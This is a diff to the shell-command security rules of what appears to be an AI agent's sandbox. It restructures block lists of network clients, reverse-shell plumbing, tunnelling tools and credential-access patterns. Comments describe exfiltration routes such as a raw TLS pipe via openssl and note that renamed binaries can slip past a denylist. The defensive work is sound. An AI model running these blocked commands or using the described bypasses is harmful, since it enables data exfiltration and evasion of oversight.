@@ -16,72 +16,27 @@ export const RM_DESTRUCTIVE_FLAGS = /\brm\s+.*(-[a-zA-Z]*f|-[a-zA-Z]*r)\b/i;
 // Everything that IS a command word is an argv rule in
 // shell-command-rule-table.ts, which reads the command being run.
 export const BLOCKED_COMMANDS = [
-  // Network exfil via pipe
-  /\bcurl\b.*\|/i,
-  /\bwget\b.*\|/i,
-  // ── Shell-as-exfiltration: best-effort denylist of network clients ──
-  // These can send data to arbitrary hosts, bypassing all HTTP/SSRF controls.
-  // The agent should use http_request (which has SSRF checks, DNS pinning,
-  // content wrapping, and audit logging) instead of raw shell network tools.
-  // This is a BEST-EFFORT denylist, not an exhaustive wall — the structural
-  // answer is the argv[0] allowlist; this chunk hardens the denylist with the
-  // common clients. New/renamed binaries can still slip a denylist.
-  // `(?<!\.)` keeps a dotfile out of it: `ls -la ~/.ssh 2>&1` names a
-  // directory, not the client (blocked live on 2026-09-28 as "uses ssh").
-  /(?<!\.)\bcurl\s/i,                       // curl (any use)
-  /(?<!\.)\bwget\s/i,                       // wget (any use)
-  /(?<!\.)\bnc\s/i,                         // netcat
-  /(?<!\.)\bncat\s/i,                       // nmap netcat
-  /(?<!\.)\bsocat\s/i,                      // socat
-  /(?<!\.)\btelnet\s/i,                     // telnet
-  /(?<!\.)\bssh\s/i,                        // ssh (outbound)
-  /(?<!\.)\bscp\s/i,                        // scp
-  /(?<!\.)\bsftp\s/i,                       // sftp
-  /(?<!\.)\brsync\s/i,                      // rsync
-  /(?<!\.)\bftp\s/i,                        // ftp
-  /(?<!\.)\baria2c\s/i,                     // aria2c download utility
-  /(?<!\.)\btftp\s/i,                       // trivial FTP client
-  // ── R4-12: additional network / dual-use binaries (denylist STOPGAP) ──
-  // openssl present on every dev box gives a clean raw-TLS pipe
-  // (`openssl s_client -connect h:443 < secrets`), websocat is a pure network
-  // tool, and the mail senders relay to arbitrary destinations. This is a
-  // userland denylist, NOT a sound wall — the durable fix is the planned
-  // OS-level sandbox (Landlock / sandbox-exec). New/renamed binaries still slip.
-  /(?<!\.)\bwebsocat\s/i,                   // websocat (network-only WebSocket client)
-  /(?<!\.)\bnc\.traditional\s/i,            // Debian netcat-traditional (the bare `\bnc\s` misses the dotted name)
-  /(?<!\.)\bsendmail\s/i,                   // sendmail (relay mail to arbitrary dest)
-  /(?<!\.)\bssmtp\s/i,                      // ssmtp (relay mail to arbitrary dest)
-  // NOTE: `mail`/`mailx` moved to DANGEROUS_INVOKE_BINS (argv[0] check) — the
-  // bare `\bword\s` form false-positived on arguments (`send mail to …`).
-  /\bopenssl\s+s_(client|server)\b/i,       // openssl s_client/s_server ONLY (raw TLS pipe); bare openssl dgst/x509/enc/genrsa stay allowed
-  // `fetch`, `http`, `https`, `xh`, `httpie`, `curlie` are deliberately NOT
-  // listed here as `\bword\s` patterns: that would false-positive on
-  // legitimate non-network commands (`git fetch`, `npm fetch`). They are
-  // network clients ONLY as the leading argv[0], so detectNetworkClientArgv0()
-  // below blocks them by command-leading basename instead (C3-12/C3-14, (e)).
-  // ── DNS / automation / opener clients (egress that bypasses HTTP/SSRF) ──
-  // These reach the network or hand a URL to another app (DNS-tunnel exfil,
-  // browser-launch-as-exfil, AppleScript-wrapped shell). `\bword\s` requires
-  // the binary be immediately followed by whitespace, so `open ` matches but
-  // `openssl `/`/usr/bin/openfoo` do not.
-  // NOTE: dig/host/nslookup/getent/ping/traceroute/open moved to
-  // DANGEROUS_INVOKE_BINS (argv[0] check). As bare `\bword\s` substrings they
-  // false-positived on benign arguments (`grep host /etc/hosts`, `… | grep
-  // open`, `echo "ping the box"`). The danger is INVOKING them, which the
-  // argv[0]-basename scan captures precisely without the false blocks.
-  // ── Network use spelled inside a script body (PowerShell / .NET / Python) ──
-  /Invoke-WebRequest\b/i,                   // PowerShell web
-  /Invoke-RestMethod\b/i,                   // PowerShell REST
-  /\bIwr\b/i,                               // PowerShell alias
-  /\bIrm\b/i,                               // PowerShell alias
-  /\bStart-BitsTransfer\b/i,               // PowerShell BITS
+  // The network clients themselves are the "network-client" argv rule
+  // (NETWORK_CLIENT_BINS below): the command being run, not a word in the line.
+  // dig/host/nslookup/getent/ping/traceroute/open are DANGEROUS_INVOKE_BINS for
+  // the same reason (`grep host /etc/hosts` is not an invocation of host).
+  /\\\n/,                                   // backslash-newline continuation (multi-line escape)
+  /\bnohup\b.*&$/i,                          // background persistent process
+  // ── Credential access ──
+  /\bcredential\s+manager/i,                 // Windows credential manager
+];
+
+// Network use spelled INSIDE a body the command walk cannot read as a command:
+// a .NET or Python script handed to an interpreter, or the socket plumbing of
+// a reverse shell. Text patterns, so they can only match words; applied, like
+// the network-client rule, only where no kernel cage holds egress.
+export const EGRESS_TEXT_PATTERNS = [
   /\bNet\.WebClient\b/i,                    // .NET web client
   /\bSystem\.Net\.Http/i,                   // .NET HTTP
   /\brequests\.(get|post|put|delete)\b/i,   // Python requests
   /\burllib\.(request|urlopen)\b/i,         // Python urllib
   /\bhttpx?\./i,                            // Python httpx
   /\baiohttp\b/i,                           // Python aiohttp
-  // ── Shell escape / injection edge cases ──
   // fd-redirect onto a NON-standard descriptor (>=3): the io-duplication a
   // reverse shell uses to wire stdio onto a pre-opened socket fd (`>&5`, `<&3`,
   // `2>&7`). The socket OPEN itself is caught by the /dev/tcp + `exec N<>` rules
@@ -90,16 +45,8 @@ export const BLOCKED_COMMANDS = [
   // narrowed pattern leaves them ALLOWED (the bare /\d+>&\d/ blocked 2>&1, which
   // starved every verify command that captured stderr).
   /[<>]&(?:[3-9]|\d{2,})/,                  // fd redirect to fd>=3 (<&3, >&5, 2>&10)
-  /\\\n/,                                   // backslash-newline continuation (multi-line escape)
-  // ── Reverse-shell plumbing ──
   /(^|[\s<>&|=])\/dev\/(tcp|udp)\//i,        // bash /dev/tcp|/dev/udp socket (reverse shell / exfil); boundary-char guard hits spaced AND glued redirects without false-firing on path/dev/tcpdump
   /\bexec\s+\d+<>/i,                        // fd exec redirect (reverse shell)
-  /\bnohup\b.*&$/i,                          // background persistent process
-  // ── Additional network exfiltration vectors ──
-  /\bdnscat\b/i,                             // DNS tunnel
-  /\bchisel\b/i,                             // TCP tunnel
-  // ── Credential access ──
-  /\bcredential\s+manager/i,                 // Windows credential manager
 ];
 
 // The command-line forms of these are argv rules now (shell-command-rule-table.ts),
@@ -224,12 +171,22 @@ export const RENAME_ESCAPE_EVAL_FLAGS = new Set([
   "-e", "-E", "-r", "-c", "-p", "--eval", "--print",
 ]);
 
-// ── C3-12/C3-14: network-client argv[0] denylist ──
-// `fetch`/`http`/`https`/`xh`/`httpie`/`curlie` are network clients ONLY when
-// they LEAD the command — `git fetch`/`npm fetch` are not. So gate them by the
-// argv[0] basename of each pipe segment, never as a substring (spec (e)).
+// ── Network clients, judged as the command being run ──
+// A network client is one only when it LEADS a command: `git fetch` is not,
+// `ls ~/.ssh 2>&1` is not, `echo curl` is not, and `curl.exe`, `/usr/bin/curl`,
+// `env curl`, `bash -c "curl …"` all are (execBasename + the command walk).
+// The rule that reads this set (shell-command-rule-table.ts, "network-client")
+// applies only where nothing else holds egress: under a kernel cage with the
+// egress proxy (macOS seatbelt, Linux netns bridge, the Windows fence) these
+// commands run and the cage decides what they reach.
 export const NETWORK_CLIENT_BINS = new Set([
   "fetch", "http", "https", "xh", "httpie", "curlie",
+  "curl", "wget", "aria2c", "websocat",
+  "nc", "ncat", "nc.traditional", "socat", "telnet",
+  "ssh", "scp", "sftp", "rsync", "ftp", "tftp",
+  "sendmail", "ssmtp",
+  "dnscat", "chisel",
+  "invoke-webrequest", "invoke-restmethod", "iwr", "irm", "start-bitstransfer",
 ]);
 
 // ── argv[0] resolution: leading tokens to skip to find the REAL command ──
